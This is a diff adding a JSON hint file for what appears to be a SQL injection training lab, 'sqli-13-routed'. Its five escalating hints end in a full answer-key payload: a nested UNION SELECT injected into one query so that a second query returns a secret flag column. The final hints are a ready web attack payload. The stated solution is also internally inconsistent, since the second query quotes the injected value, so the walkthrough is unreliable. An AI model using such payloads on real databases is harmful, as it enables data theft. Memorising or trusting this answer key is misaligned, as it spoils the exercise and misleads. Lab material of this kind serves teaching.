@@ -1,0 +1,30 @@
+{
+  "labId": "sqli-13-routed",
+  "hints": [
+    {
+      "level": 1,
+      "title": "Nudge",
+      "content": "There are two queries happening. The first one returns an ID, which is used in the second one. If you can control what the first query returns, you can inject into the second."
+    },
+    {
+      "level": 2,
+      "title": "Direction",
+      "content": "The first query: SELECT id FROM tickets WHERE ref_code='INPUT'. The result goes into: SELECT * FROM tickets WHERE id='RESULT'. You need a UNION in the first query that returns a payload that will inject into the second query."
+    },
+    {
+      "level": 3,
+      "title": "Approach",
+      "content": "Inject into the first query with UNION SELECT to return a crafted string. That string should be a SQL injection payload for the second query. Think of it as: inject a UNION SELECT into query 1, where the selected value is itself a UNION SELECT payload for query 2."
+    },
+    {
+      "level": 4,
+      "title": "Near-solution",
+      "content": "First query injection: ' UNION SELECT '0 UNION SELECT 1,flag_value,3,4 FROM ticket_secrets-- ' -- This makes query 1 return the string: 0 UNION SELECT 1,flag_value,3,4 FROM ticket_secrets-- which then executes in query 2."
+    },
+    {
+      "level": 5,
+      "title": "Solution",
+      "content": "Enter as reference code: ' UNION SELECT '0 UNION SELECT 1,flag_value,3,4 FROM ticket_secrets-- '-- \n\nQuery 1 becomes: SELECT id FROM tickets WHERE ref_code='' UNION SELECT '0 UNION SELECT 1,flag_value,3,4 FROM ticket_secrets-- '--\nThis returns: 0 UNION SELECT 1,flag_value,3,4 FROM ticket_secrets--\n\nQuery 2 becomes: SELECT * FROM tickets WHERE id='0 UNION SELECT 1,flag_value,3,4 FROM ticket_secrets--'\nWhich executes the UNION and displays the flag."
+    }
+  ]
+}
